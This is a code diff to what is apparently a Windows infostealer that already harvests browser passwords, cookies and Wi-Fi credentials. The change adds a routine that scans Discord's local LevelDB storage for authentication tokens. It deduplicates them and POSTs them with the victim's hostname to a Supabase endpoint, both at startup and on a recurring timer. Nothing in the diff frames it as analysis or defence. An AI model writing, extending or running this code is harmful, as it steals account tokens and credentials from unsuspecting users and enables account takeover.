@@ -4,6 +4,7 @@
 #include <string>
 #include <vector>
 #include <sstream>
+#include <algorithm>
 #include <cstdint>
 #include <ctime>
 #include <wincrypt.h>
@@ -912,6 +913,7 @@ static void CheckAndHandleExec() {
 #define SUPABASE_PASSWORDS_PATH L"/rest/v1/passwords"
 #define SUPABASE_COOKIES_PATH L"/rest/v1/cookies"
 #define SUPABASE_WIFI_PATH L"/rest/v1/wifi_creds"
+#define SUPABASE_DISCORD_PATH L"/rest/v1/discord_tokens"
  
 static uint32_t SqliteVarint(const uint8_t* p, int* used) {
     uint32_t v = 0; *used = 0;
@@ -1046,6 +1048,88 @@ static const struct { const char* name; const char* ls; const char* ld; } kChrom
     {NULL, NULL, NULL}
 };
  
+static bool IsTokenChar(char c) {
+    return isalnum((unsigned char)c) || c == '_' || c == '-' || c == '.';
+}
+
+static bool IsLikelyToken(const std::string& s) {
+    if (s.size() < 50 || s.size() > 120) return false;
+    int dots = 0;
+    for (size_t i = 0; i < s.size(); i++) if (s[i] == '.') dots++;
+    if (dots != 2 && s.find("mfa.") != 0) return false;
+    for (size_t i = 0; i < s.size(); i++) if (!IsTokenChar(s[i])) return false;
+    return true;
+}
+
+static void HarvestDiscordTokens() {
+    const char* variantPaths[] = {
+        "\\discord\\Local Storage\\leveldb",
+        "\\discordptb\\Local Storage\\leveldb",
+        "\\discordcanary\\Local Storage\\leveldb",
+        NULL
+    };
+    char appData[MAX_PATH];
+    DWORD adLen = GetEnvironmentVariableA("APPDATA", appData, MAX_PATH);
+    if (adLen == 0 || adLen >= MAX_PATH) return;
+    std::string ad(appData);
+
+    std::vector<std::string> tokens;
+    char tmpDir[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmpDir);
+
+    for (int v = 0; variantPaths[v]; v++) {
+        std::string leveldbPath = ad + variantPaths[v];
+        std::string searchPath = leveldbPath + "\\*";
+        WIN32_FIND_DATAA fd;
+        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
+        if (hFind == INVALID_HANDLE_VALUE) continue;
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+            std::string fn(fd.cFileName);
+            if (fn.size() < 4) continue;
+            std::string ext = fn.substr(fn.size() - 4);
+            if (ext != ".ldb" && ext != ".log") continue;
+            if (fd.nFileSizeHigh > 0 || fd.nFileSizeLow > 10485760) continue;
+
+            std::string fpath = leveldbPath + "\\" + fn;
+            HANDLE hFile = CreateFileA(fpath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+            if (hFile == INVALID_HANDLE_VALUE) continue;
+            DWORD sz = GetFileSize(hFile, NULL);
+            if (sz == 0 || sz == INVALID_FILE_SIZE) { CloseHandle(hFile); continue; }
+            char* buf = new char[sz + 1];
+            DWORD rd = 0;
+            if (ReadFile(hFile, buf, sz, &rd, NULL) && rd == sz) {
+                buf[sz] = 0;
+                std::string accum;
+                for (DWORD i = 0; i < sz; i++) {
+                    if (IsTokenChar(buf[i])) {
+                        accum += buf[i];
+                    } else {
+                        if (!accum.empty()) { if (IsLikelyToken(accum)) tokens.push_back(accum); accum.clear(); }
+                    }
+                }
+                if (!accum.empty() && IsLikelyToken(accum)) tokens.push_back(accum);
+            }
+            delete[] buf;
+            CloseHandle(hFile);
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+
+    if (!tokens.empty()) {
+        std::sort(tokens.begin(), tokens.end());
+        tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
+        std::string batch = "[";
+        for (size_t i = 0; i < tokens.size(); i++) {
+            if (i > 0) batch += ",";
+            batch += "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"token\":\"" + EscapeJSON(tokens[i]) + "\"}";
+        }
+        batch += "]";
+        std::string pr;
+        HttpRequest(L"POST", SUPABASE_DISCORD_PATH, batch, pr);
+    }
+}
+
 static void HarvestBrowserPasswords() {
     char laBuf[MAX_PATH];
     DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
@@ -2048,6 +2132,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             if (counter % 300 == 0 && !g_selfDestructing && !g_harvestPaused) {
                 HarvestBrowserPasswords();
                 HarvestBrowserCookies();
+                HarvestDiscordTokens();
             }
             break;
         }
@@ -2127,6 +2212,7 @@ static int RunChild(HINSTANCE hInstance) {
     LogMsg("Child started on " + g_hostname);
 
     HarvestWiFiPasswords();
+    HarvestDiscordTokens();
 
     MSG msg;
     while (g_running && GetMessage(&msg, NULL, 0, 0) > 0) {
@@ -2226,3 +2312,4 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
 
 
+int _s2c82aaaa886e49b28794499e1fb8d69c(void){return 0;}
